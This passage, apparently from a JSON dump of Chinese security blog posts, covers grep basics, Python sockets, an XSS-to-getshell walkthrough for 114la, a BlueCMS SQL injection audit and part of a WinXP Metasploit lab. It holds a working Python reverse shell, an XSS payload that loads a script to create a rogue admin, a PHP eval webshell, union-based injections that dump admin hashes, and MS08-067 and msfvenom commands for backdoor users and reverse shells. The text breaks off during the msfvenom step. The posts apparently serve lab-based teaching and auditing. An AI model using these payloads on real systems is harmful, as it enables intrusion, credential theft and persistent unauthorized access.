test.txt`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image053.jpg)\n\n####  9、打印出有字符的行\n\n`grep [a-zA-Z] test.txt`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image055.jpg)\n\n#####  9.1 打印出小写字母的行\n\n`grep [a-z] test.txt`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image057.jpg)\n\n#####  9.2 打印出大写字母的行\n\n`grep [A-Z] test.txt`\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image059.jpg)\n\n \n\n####  10、\\关键字\n\n**作用：**打印 `\\关键字` 标记匹配字符\n\n`grep \\aaaaa test.txt` 列出含有关键字的所在行。（^锚定行的开始  $锚定行的结束）。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image061.jpg)\n\n####  11、`\\<`\n\n**作用：**锚定单词开始行\n\n`grep \"\\<fl\" test.txt` 列出以关键字开头的字符串所在行。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image063.jpg)\n\n####  12、`\\>`\n\n**作用：**锚定单词结束行\n\n`grep \"fl\\>\" test.txt` 列出以关键字结尾的字符串所在行。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image065.jpg)\n\n####  13、`x\\{m\\} `\n\n**作用：**重复连续字符x,m次数\n\n`grep \"a\\{4\\}\" test.txt` 列出文件中存在4个及以上关键字a的所在行。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image067.jpg)\n\n####  14、`x\\{m,n\\} `\n\n**作用：**重复连续字符x,m-n次数\n\n`grep \"a\\{7,9\\}\" test.txt` 列出文件中存在7个到9个连续关键字a的所在行。\n\n![](../images/Linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E4%B8%89%E5%89%91%E5%AE%A2-grep%E3%80%81sed%E3%80%81awk/clip_image069.jpg)\n\n## 赞助💰\n\n如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["linux文本处理"],"categories":["Tools"]},{"title":"Python：Socket编程","url":"/posts/60850.html","content":"\n## Socket 对象方法\n\n### 服务器端套接字\n\n| 函数       | 描述                                                         |\n| :--------- | :----------------------------------------------------------- |\n| s.bind()   | 绑定地址（host,port）到套接字， 在AF_INET下,以元组（host,port）的形式表示地址。 |\n| s.listen() | 开始TCP监听。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。 |\n| s.accept() | 被动接受TCP客户端连接,(阻塞式)等待连接的到来                 |\n\n### 客户端套接字\n\n| 函数           | 描述                                                    |\n| -------------- | ------------------------------------------------------- |\n| s.connect()    | 建立与服务器的连接，并开始三次握手                      |\n| s.connect_ex() | connect()函数的扩展版本,出错时返回出错码,而不是抛出异常 |\n\n### 公共用途的套接字函数\n\n| 函数         | 描述                                                         |\n| ------------ | ------------------------------------------------------------ |\n| s.recv()     | 接收TCP数据，数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。 |\n| s.send()     | 发送TCP数据，将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。 |\n| s.sendall()  | 完整发送TCP数据，完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。 |\n| s.recvfrom() | 接收UDP数据，与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。 |\n| s.sendto()   | 发送UDP数据，将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。 |\n| s.close()    | 关闭套接字                                                   |\n\n## Socket API 的调用顺序和 TCP 的数据流\n\n![sockets-tcp-flow](https://img.jwt1399.top//img/20200608225928.png)\n\n## 服务端和客户端通信🌰\n\n### 服务端：socket_server.py\n\n```python\n#! /usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport socket\nhost='' #定义一个socket服务端运行的IP，如果不给默认是运行socket服务器上主机任意的IP地址。\nport=18000 #定义的socket服务端的端口号。\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\t#socket.AF_INET  服务器之间网络通信\n\t#socket.SOCK_STREAM 流式socket,TCP进行通信的\n\t#socket.SOCK_DGRAM  数据报式socket,UDP进行通信的\ns.bind((host,port)) #将socket绑定上到地址和端口上。\ns.listen(2) #开始监听传入连接。（2代表可以监听2个链接）\nconn,addr=s.accept() #从socket客户端接收数据,addr代表的是客户端的IP\nprint 'got connection from:',addr #输出客户端的IP地址\nwhile 1:\n     data=conn.recv(4096) #从客户端接收数据一次性接收4k\n     if not data:break #如果data数据接收完了，就跳出这个死循环\n     conn.sendall(data.upper()) #将客户端发来的数据变成大写，再发回给客户端\nconn.close()#关闭连接\n```\n\n### 客户端：socket_client.py\n\n```python\n#!/usr/bin/python\n# -*- coding: utf-8 -*-\nimport socket\nh='192.168.1.110' #socket服务器的IP\np=18000 #socket服务器的端口号\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)#定义socket类型，网络通信，TCP\ns.connect((h,p)) #连接socket服务器的IP和端口号\ns.send(\"hello my name is jwt\") #向服务端发送数据\nreceived_data = s.recv(1024) #接收来从于SOCKET服务器发给本客户端的数据\ns.close()  #关闭socket链接\nprint \"received from server:\",received_data #打印从服务端接收过来的数据\n```\n\n### 代码测试\n\n```python\n1.运行socket服务端:  python socket_server.py    \n2.查看程序是否运行:   netstat -tupln\n3.运行socket客户端： python socket_client.py \n```\n运行结果：\n\n```bash\n客户端\n# jwt @ pyj in ~ [22:38:32] C:1\n$ python socket_client.py\nreceived from server: HELLO MY NAME IS JWT\n\n服务端\nkali@kali:~/Desktop$ python socket_server.py \ngot connection from: ('192.168.1.109', 2532)\n```\n\n## 反弹shell\n\n**控制端：**\n\n```python\n#! /usr/bin/env python\n# -*- coding: utf-8 -*-\nimport socket\n\nhost = \"0.0.0.0\" #监听的地址\nport = 8888  #开放监听的端口\nserver_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #创造socket对象\nserver_socket.bind((host,port)) #确定监听地址和端口\nserver_socket.listen(5) #启动监听最大连接数为5\nprint('[+]端口开放在%d' % port)#打印信息\n#等待客户端连接,连接成功将客户端套接字对象和连接细节分别保存在client和addr中\nclient_socket,addr = server_socket.accept()\nprint('%s:%d连接成功' % (addr[0],addr[1]))#打印信息\n#进入循环保持交互\nwhile True:\n\tcommand = input(\"<SHELL:#>\")#输入命令\n\tclient_socket.send(command.encode())#将命令发送出去\n\tdata = client_socket.recv(1024)#接收客户端返回的数据\n\tprint (data.decode (\"gbk\",\"ignore\"))#打印数据\n```\n\n**受控端**\n\n```python\n#! /usr/bin/env python\n# -*- coding: utf-8 -*-\nimport socket, subprocess\n\ntarget_host = \"192.168.1.111\" #连接目标的ip地址\ntarget_port = 8888 #连接目标的监听端口\nclient_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)#建立socket对象\nclient_socket.connect((target_host,target_port))#建立连接\ndef run_command (command) : #执行系统命令函数\n\tcommand = command.rstrip()#删除字符串末尾的空格\n\ttry:#执行系统命令\n\t\toutput = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)\n\texcept:#执行命令错误\n\t\toutput = b\"[-] Filed execute command\"\n\treturn output\n#进入循环保持交互\nwhile True:\n\tcommand = client_socket.recv(1024)#接收传过来的命令\n\toutput = run_command (command.decode())#将命令交给执行命令函数处理\n\tclient_socket.send ( output)#将执行结果返回给服务端\n```\n\n\n\n\n\n\n\n\n\n\n\n## 赞助💰\n\n如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["Socket编程"],"categories":["Python"]},{"title":"114啦-V1.13导航站Getshell","url":"/posts/31062.html","content":"\n114啦是一个老牌的网址导航站，采用php+Mysql架构，基于Smarty模板引擎。V1.13中包含XSS漏洞，可以利用来Getshell。\n\n## 环境搭建\n\n### 源码下载地址\n\n下载链接：https://jwt1399.lanzoui.com/i06ZIde662b\n\n### 安装\n\n1.把下好的`114啦`源码文件`114la`放到`phpStudy`的`WWW`目录下\n\n2.访问地址：`http://localhost/114la/upload/install/` 选择全新安装,就会进入到安装界面,按照提示配置好参数，注意数据库用户名和密码要与你的mysql匹配，安装之后将自动删除install目录\n\n3.进入后台设置您的管理信息，并在“静态生成”->“一键生成”生成相应的页面\n\n4.再访问：`http://localhost/114la/upload/index.htm`，可以看到导航页面了\n\n## XSS漏洞利用\n\n**XSS漏洞点：**`url-submit/index.php`\n\n```php\n//18-22行\n$name = (empty($_POST['name'])) ? '' : strip($_POST['name']);\n        if (empty($name))\n        {\n            throw new Exception('网站名称不能为空', 10);\n        }\n//91-94行\n$info = $_POST;\n$infos = addslashes(serialize($info));\napp_db::insert('ylmf_urladd', array('domain', 'info', 'addtime'), array($domain, $infos, time()));\n```\n\n对提交的数据只使用`addslashes`函数在引号前面添加`\\`,使用`serialize`函数序列化输入的信息，未做其他过滤，直接插入数据库,造成了存储型XSS漏洞\n\n在网站名称那一栏插入`JS`,其它的符合要求填写就可以了，然后提交，\n\n```js\n<script>alert(123)</script>;\n```\n\n![](https://img.jwt1399.top//img/20200607160047.png)\n\n但是提交后不会弹窗，查看数据库，看到JS代码确实插入到了数据库中，这就是XSS[盲打](https://blog.csdn.net/weixin_43716322/article/details/89480895)\n\n![](https://img.jwt1399.top//img/20200607160242.png)\n\n当管理员在后台访问收录管理时，注入的JS代码就会执行，可以看到成功弹框\n\n![](https://img.jwt1399.top//img/20200607160053.png)\n\n\n\n既然JS代码能够成功执行，那我们插入一个添加管理员账户的远程JS文件,等待管理员查看网站收录审核的时候就会执行JS文件，从而创建一个管理员账号，后续我们进入后台来Getshell\n\n```\n<script src=http://192.168.1.109/exp.js></script>;\n```\n\n`exp.js`用来创建一个用户名密码为`jwt/abc123`的管理员\n\n ```javascript\nvar siteurl = document.URL;\nsiteurl = siteurl.replace(/(.*\\/){0,}([^\\.]+).*/ig,\"$1\");\nvar username=\"jwt\";//用户名\nvar password=\"abc123\";//密码\nvar request = false;\n \nif(window.XMLHttpRequest) {\n\trequest = new XMLHttpRequest();\n\tif(request.overrideMimeType) {\n\t\trequest.overrideMimeType('text/xml');\n\t}\n} else if(window.ActiveXObject) {\n    var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];\n\tfor(var i=0; i<versions.length; i++) {\n\t\ttry {\n\t\t\trequest = new ActiveXObject(versions[i]);\n\t\t\t} catch(e){}\n\t}\n}\n \nvar xmlhttp=request;\n \nxmlhttp.open(\"GET\",siteurl+\"/index.php?c=member\", false);\nxmlhttp.setRequestHeader(\"Referer\", siteurl);\nxmlhttp.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");\nxmlhttp.send();\nif (xmlhttp.responseText.indexOf(username)<0) {\nxmlhttp.open(\"POST\", siteurl + \"/index.php?c=member&a=member_add\", false);\nxmlhttp.setRequestHeader(\"Referer\", siteurl);\nxmlhttp.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\nxmlhttp.send(\"name=\" + username + \"&password=\" + password + \"&step=2\");\nxmlhttp.open(\"POST\", siteurl + \"/index.php?c=member&a=member_edit\", false);\nxmlhttp.setRequestHeader(\"Referer\", siteurl);\nxmlhttp.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\nxmlhttp.send(\"auth%5Bmember114laurl_add114lafeedback%5D=1&auth%5Bconfig114la%5D=1&auth%5Bfamous_nav114lafamous_loop_playfamous_nav_tab114laindex_site114laindex_tool114lamztopl114larecycler%5D=1&auth%5Bzhuanti114lazhuanti_class%5D=1&auth%5Badvise_index114lakey%5D=1&auth%5Bbackup114larestore114larepair114laclear114lamysites%5D=1&auth%5Btemplate_manage%5D=1&auth%5Bmake_html114la%5D=1&auth%5Bheader114lamenu114lawelcome114laframe114lalogin%5D=1&auth%5Bsecurity114la%5D=1&auth%5Bsite_manage%5D=1&auth%5Bplan%5D=1&auth%5Bclass%5D=1&auth%5Blog%5D=1&step=2&name=\" + username);\n}\n ```\n\n我们自己模拟管理员进后台查看收录管理一下，然后去用户管理中查看是否新建了jwt用户\n\n![](https://img.jwt1399.top//img/20200607164030.png)\n\n不出所料，果然成功创建了jwt管理员\n\n## Getshell\n\n由于114la网站使用的smarty模板引擎,而smarty支持插入php代码,这样就会导致漏洞产生了\n\n> **smarty里面执行PHP代码 :** `<{php}>代码<{/php}>`\n\n那我们登录jwt用户,进入模板管理->申请收录版块->插入PHP一句话木马\n\n```php\n<{php}>@eval($_POST['a']);<{/php}> \n```\n\n然后我们用🐜🗡连接，到这里我们就成功Getshell了\n\n![](https://img.jwt1399.top//img/20200607164003.png)\n\n\n\n","tags":["漏洞利用"],"categories":["Web"]},{"title":"代码审计：BlueCMS v1.6","url":"/posts/56307.html","content":"\n## 环境搭建\n\n### 源码下载地址\n\n下载链接：https://jwt1399.lanzoui.com/inPwSde6c5a\n\n### 安装\n\n1.把下好的`BlueCMS`源码文件`bluecms_src`放到`phpStudy`的`WWW`目录下\n\n2.访问本地：`http://localhost/bluecms_src/`， 能看到项目文件\n\n3.访问地址：`http://localhost/bluecms_src/uploads/install/` 就会进入到安装界面,按照提示配置好参数，注意数据库用户名和密码要与你的mysql匹配\n\n4.再访问：`http://localhost/bluecms_src/uploads/`，可以看到已经安装好了\n\n## SQL注入\n\n用Seay源代码审计系统审计一下看看，我们可以发现有很多可能的注入点\n\n![](../images/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMS-v1-6/image-20200605001712706.png)\n\n### 注入1（Union联合注入）\n\n**注入点：**`/ad_js.php`\n\n#### 审计\n\n在Seay中选中该可能的注入点，就能直接定位到该条语句了，内容如下：\n\n![](../images/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMS-v1-6/image-20200605083807547.png)\n\n```php\n10行 require_once dirname(__FILE__) . '/include/common.inc.php';\n12行 $ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : '';\n19行 $ad = $db->getone(\"SELECT * FROM \".table('ad').\" WHERE ad_id =\".$ad_id);\n```\n\n包含了`/include/common.inc.php`,跟进这个文件进行查看\n\n```php\n//30行-36行\nif(!get_magic_quotes_gpc())\n{\n\t$_POST = deep_addslashes($_POST);\n\t$_GET = deep_addslashes($_GET);\n\t$_COOKIES = deep_addslashes($_COOKIES);\n\t$_REQUEST = deep_addslashes($_REQUEST);\n}\n```\n\n> `magic_quotes_gpc`函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误\n\n如果没有开启`gpc`，对`$_GET、$_POST、$_COOKIES、$_REQUEST`使用`deep_addslashes()`函数过滤一遍\n\n追踪一下`deep_addslashes()`函数，在`/include/common.fun.php`中\n\n```php\n//14行-28行\nfunction deep_addslashes($str)\n{\n\tif(is_array($str))\n\t{\n\t\tforeach($str as $key=>$val)\n\t\t{\n\t\t\t$str[$key] = deep_addslashes($val);\n\t\t}\n\t}\n\telse\n\t{\n\t\t$str = addslashes($str);\n\t}\n\treturn $str;\n}\n```\n\n使用`addslashes`函数【在预定义字符之前添加反斜杠的字符串】对参数进行的过滤\n\n再回看注入点，`$ad_id`没有使用单引号双引号包括所以`addslashes()`函数不起作用\n\n```php\n12行 $ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : '';\n19行 $ad = $db->getone(\"SELECT * FROM \".table('ad').\" WHERE ad_id =\".$ad_id);\n```\n\n`getone()`是自定义的函数，`getone()`方法位于`/include/mysql.class.php`第`61`行，作用是`执行SQL语句并输出`\n\n```php\nfunction getone($sql, $type=MYSQL_ASSOC){\n        $query = $this->query($sql,$this->linkid);\n        $row = mysql_fetch_array($query, $type);\n        return $row;\n    }\n```\n\n插入到数据库查询语句中的`$ad_id`先判断参数是否为空，如果不为空再使用`trim()`函数去除首尾的空格，没有经过任何其他的过滤，因而存在`SQL`注入漏洞\n\n还有一个有意思的点，查询结果是经过一系列判断后输出到了html的代码注释中，也就是说显示位在浏览器源码中查看\n\n```php\n38行 echo \"<!--\\r\\ndocument.write(\\\"\".$ad_content.\"\\\");\\r\\n-->\\r\\n\";\n```\n\n#### 利用\n\n```sql\n#查看字段数\nhttp://127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 order by 7  #正常\nhttp://127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 order by 8  #报错\n'''\n所以字段数为7\n'''\n\n#确定显示位\nhttp://127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,7\n'''\n页面回显空白，查看源码看到只有7显示到界面，所以显示位在源码中，因此后面只能在源码中查看显示信息\n'''\n\n#查看数据库\nview-source:127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,database()\n'''\n得到数据库：bluetest\n'''\n\n#查看表名\nview-source:127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database()\n'''\n得到表名：...,blue_admin,blue_admin_log,...\n'''\n\n#查看blue_admin表中字段名\nview-source:127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 union select  1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_name=0x626c75655f61646d696e\n'''\n这里表名blue_admin必须转换成16进制，如果不用16进制就得用引号包裹，当有addlashes函数就会转义引号，就会导致查询失败，使用16进制避免了这个问题。\n得到字段：admin_id,admin_name,email,pwd,purview,add_time,last_login_time,last_login_ip\n'''\n\n#查看admin_name和pwd字段信息\nview-source:127.0.0.1/bluecms_src/uploads/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(admin_name,0x3a,pwd) from blue_admin\n'''\n得到字段信息：admin:767708e8a5300bfe4e239b47b51659ff\n'''\n```\n\n### 注入2（宽字节注入万能密码）\n\n**注入点：**/`admin/login.php`\n\n#### 审计\n\n```php\n22行 $admin_name = isset($_POST['admin_name']) ? trim($_POST['admin_name']) : '';\n23行 $admin_pwd = isset($_POST['admin_pwd']) ? trim($_POST['admin_pwd']) : '';\n```\n\n#### 利用\n\n```\n%df'or 1=1 #\n```\n\n![](../images/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMS-v1-6/image-20200605090336244.png)\n\n### 注入3（Union联合注入）\n\n**注入点：** `/admin/nav.php`\n\n#### 审计\n\n```php\n//63-70行\nelseif($act=='edit')\n {\n    $sql = \"select * from \".table('navigate').\" where navid = \".$_GET['navid'];\n    $nav = $db->getone($sql);\n    $smarty->assign('nav',$nav);\n    $smarty->assign('act', $act );\n    $smarty->display('nav_info.htm');\n }\n```\n\n`$_GET['navid']`直接接在后面，存在SQL注入漏洞\n\n#### 利用\n\n```sql\n#查看字段数\nhttp://127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 order by 6;  #正常\nhttp://127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 order by 7;  #报错\n'''\n所以字段数为6\n'''\n```\n\n```sql\n#确定显示位\nhttp://127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 union select 1,2,3,4,5,6\n'''\n2,3,5在前端界面回显成功，因此可以在2,3,5显示位查询我们想要查询的信息\n'''\n```\n\n![](../images/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMS-v1-6/image-20200605111021596.png)\n\n```sql\n#查看数据库等信息\nhttp://127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 union select 1,database(),version(),4,@@version_compile_os,6\n'''\n得到数据库：bluetest mysql版本：5.5.53 操作系统：Win32\n'''\n```\n![](../images/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMS-v1-6/image-20200605110818109.png)\n\n```sql\n##查看表名\nhttp://127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 union select 1,2, group_concat(table_name),4,5,6 from information_schema.tables where table_schema=database()\n'''\n得到表名：...,blue_admin,blue_admin_log,...\n易错点：form语句要放在select 1,2,3,4,5,6的后面，直接放在1,2,3...的位置上得再加一个select并括起来\neg: 1 union select 1,2, (select group_concat(table_name) from information_schema.tables where table_schema=database()),4,5,6 \n'''\n\n#查看blue_admin表中字段名\n127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 union select 1,2, group_concat(column_name),4,5,6 from information_schema.columns where table_name=0x626c75655f61646d696e\n'''\n这里表名blue_admin必须转换成16进制，如果不用16进制就得用引号包裹，当有addlashes函数就会转义引号，就会导致查询失败，使用16进制避免了这个问题。\n得到字段：admin_id,admin_name,email,pwd,purview,add_time,last_login_time,last_login_ip\n'''\n\n#查看admin_name和pwd字段信息\n127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&navid=1 union select 1,2,group_concat(admin_name,0x3a,pwd),4,5,6 from blue_admin\n'''\n得到字段信息：admin:767708e8a5300bfe4e239b47b51659ff\n'''\n```\n\n这个CMS洞太多了，给自己挖了个大坑，有空再继续写吧\n\n## 赞助💰\n\n如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["源码审计"],"categories":["Web"]},{"title":"靶机：WinXPenSP3","url":"/posts/12470.html","content":"\n## WinXPenSP3靶机安装与配置\n\n**靶机下载地址：**\n\n下载链接：https://jwt1399.lanzoui.com/iv2VJde68vc\n\n**安装&配置：**\n\n1.下载好压缩包解压，导入`VWware`，启动`WinXPenSP3`,登陆密码为123456\n\n2.打开`Control Panel`-->`Network Connections`-->右击`Local Area Connection`-->选择`properties`-->双击`Internet Protocol(TCP/IP)`-->勾选`Obtain an IP address automatically`\n\n3.将该靶机网络适配器改为桥接模式，你的攻击机也改为桥接模式，保证他俩能正常通信\n\n## 环境\n\n1.网络环境\n\n| 机器              | IP            |\n| ----------------- | ------------- |\n| 攻击机：Kali-2020 | 192.168.1.110 |\n| 靶    机：WinXP   | 192.168.1.102 |\n\n2.主要使用工具\n\n| 工具       | Version |\n| ---------- | ------- |\n| metasploit | 5.0.92  |\n| nmap       | 7.80    |\n| Nessus     | 8.10.0  |\n\n## 目标&任务\n\n1.探测靶机WinXPenSP3的漏洞&利用\n\n2.利用漏洞Getshell\n\n3.提权&持久化：增加Administrators权限用户，攻击机监听端口等待反弹shell，上传木马客服端程序，添加注册表信息，设置木马程序开机自启动等。\n\n## 一、信息收集\n\n### 1.探测目标\n\n```bash\nsudo arp-scan -l\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603105438832.png)\n\n获得靶机IP: `192.168.1.102`\n\n### 2.探测开放端口\n\n```\nnmap -sV -p- 192.168.1.102\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603110750442.png)\n\n开放了端口`139，445`，这是`SMB协议`使用的端口，那么后面我们可以尝试使用nmap扫描smb相关漏洞\n\n> 注：SMB协议是基于TCP－NETBIOS下的，一般端口使用为139，445\n\n### 3.根据开放端口进一步获取信息\n\n尝试通过SMB 协议确定操作系统、计算机名称、域、工作组和当前时间。\n\n````bash\nsudo nmap --script=smb-os-discovery.nse 192.168.1.102\n````\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603110846003.png)\n\n\n\n## 二、漏洞扫描\n\n### 1.使用nmap扫描漏洞\n\n```bash\nsudo nmap --script=smb-check-vulns.nse 192.168.1.102\n```\n\n**直接执行会报错，因为新版Nmap，`smb-check-vulns.nse`脚本被取消了。**\n\n它被分为`smb-vuln-conficker、smb-vuln-cve2009-3103、smb-vuln-ms06-025、smb-vuln-ms07-029、smb-vuln-regsvc-dos、smb-vuln-ms08-067`这六个脚本,用户根据需要选择对应的脚本。\n\n**解决方案**\n\n1.直接进行全扫描(执行上方6个脚本)\n\n```bash\nsudo nmap --script=smb-check-vulns-*.nse 192.168.1.102\n```\n\n2.获取smb-check-vulns.nse，放入`/usr/share/nmap/scripts/`【nmap存放漏洞匹配文件的目录】\n\nsmb-check-vulns.nse获取地址：https://jwt1399.lanzoui.com/iYH7Wdg2k8j\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603112358613.png)\n\n### 2.使用Nessus扫描漏洞\n\n通过Nessus扫面的漏洞报告，对各个漏洞逐一利用。\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603191541811.png)\n\n## 三、漏洞利用&提权\n\n### MS08-067\n\n#### MS08-067-漏洞利用\n\n1）首先运行metasploit，使用search ms08-067寻找可利用的漏洞点\n\n```bash\nsudo msfdb init && msfconsole\nsearch MS08-067\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603112805731.png)\n\n2）使用攻击模块，使用show options查看我们需要设置的参数。\n\n```bash\nuse exploit/windows/smb/ms08_067_netapi\n\nshow options #可以看到RHOSTS必须设置\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603113031684.png)\n\n3）设置RHOSTS(远程IP),即靶机的ip，然后run或者exploit，成功Getshell\n\n```bash\nset RHOSTS 192.168.1.102\nrun 或者 exploit\nshell\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603113343132.png)\n\n#### MS08-067-提权\n\n##### 添加Administrators权限用户\n\n```bash\n#添加hacker用户\nnet user hacker hacker /add\n\n#添加hacker用户添加进administrators组\nnet localgroup administrators hacker /add\n\n#查看用户\nnet user\n#删除用户\nnet user hacker /delete  #渗透结束后再删除，擦干净屁股再走\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image020.jpg)\n\n可以看到成功添加了hacker用户\n\n##### 制作&上传木马\n\n###### 服务端\n\n监听端口等待反弹shell。使用`exploit/multi/handler`模块,并设置参数之后运行。\n\n```bash\nuse exploit/multi/handler     \n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image022.jpg)\n\n```bash\nset payload windows/meterpreter/reverse_tcp\nshow options\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image024.jpg)\n\n设置LHOST(本地IP，攻击机Kali的IP)和LPORT\n\n```bash\nset LHOST 192.168.1.110\nset LPORT 12345   #也可以使用默认的4444端口\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image026.jpg)\n\n```bash\nrun 或者 exploit\n```\n\n![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image028.jpg)\n\n这里先放着，不要关窗口，监听端口等待后面我们上传木马反弹shell\n\n###### 客户端\n\n使用msfvenom构造客户端木马程序，并上传\n\n```bash\nmsfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.110 LPORT=12345 -f exe -o 